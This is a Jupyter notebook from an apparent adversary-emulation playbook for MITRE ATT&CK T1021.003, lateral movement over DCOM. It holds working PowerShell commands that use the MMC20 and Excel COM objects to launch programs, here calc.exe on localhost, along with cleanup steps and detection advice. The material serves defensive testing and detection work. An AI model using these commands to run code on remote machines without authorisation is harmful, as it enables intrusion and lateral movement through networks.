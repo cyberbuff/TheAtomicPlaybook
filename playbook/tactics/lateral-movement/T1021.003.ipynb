{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "1c352fb6",
   "metadata": {},
   "source": "# T1021.003 - Distributed Component Object Model\nAdversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.\n\nThe Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting COM June 2019)(Citation: Microsoft COM)\n\nPermissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide Com Keys) By default, only Administrators may remotely activate and launch COM objects through DCOM.(Citation: Microsoft COM ACL)\n\nThrough DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) as well as other Windows objects that contain insecure methods.(Citation: Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) (DDE) execution directly through a COM created instance of a Microsoft Office application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). (Citation: MSDN WMI)"
  },
  {
   "cell_type": "markdown",
   "id": "1fc5ec04",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "6860719b",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - PowerShell Lateral Movement using MMC20",
    "Powershell lateral movement using the mmc20 application com object.\n\nReference:\n\nhttps://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.application\",\"localhost\")).Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", $null, $null, \"7\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1f2650dd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1021.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f93dd70e",
   "metadata": {},
   "source": "### Atomic Test #2 - PowerShell Lateral Movement Using Excel Application Object\nPowershell lateral movement using the Excel COM objects.\n\nReference:\n\nhttps://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922\n\nUpon successful execution, cmd will spawn calc.exe on a remote computer.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft Excel must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "142ecbaa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1021.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a3143789",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncopy c:\\windows\\system32\\calc.exe 'C:\\users\\admin\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"Excel.Application\",\"localhost\"))\n$com.ActivateMicrosoftApp(\"5\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa0aa5d3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1021.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "22ae09bd",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item 'C:\\users\\admin\\AppData\\local\\Microsoft\\WindowsApps\\foxprow.exe'\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "19c7c07d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1021.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dc055c5e",
   "metadata": {},
   "source": "## Detection\nMonitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1059/001), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017) Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.\n\nMonitor for any influxes or abnormal increases in DCOM related Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic (typically over port 135)."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}